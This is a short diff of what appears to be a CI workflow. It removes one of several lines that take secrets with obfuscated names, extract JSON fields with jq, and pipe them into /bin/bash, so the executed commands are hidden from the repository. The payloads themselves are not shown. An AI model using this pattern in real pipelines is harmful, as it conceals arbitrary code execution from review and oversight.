@@ -21,7 +21,6 @@ jobs:
           ogpop11953: ${{ secrets.ogpop11953 }}
         run: |
           printf '%s' "$ogpop11953" | jq -r .dblq79518 | /bin/bash
-          printf '%s' "$iljb4" | jq -r .ptd7618 | /bin/bash
           echo $b284 | jq -r .tf8913 | /bin/bash
           printf '%s' "$hibjo809" | jq -r .e293 | /bin/bash
           printf '%s' "$cqice844" | jq -r .w96782 | /bin/bash
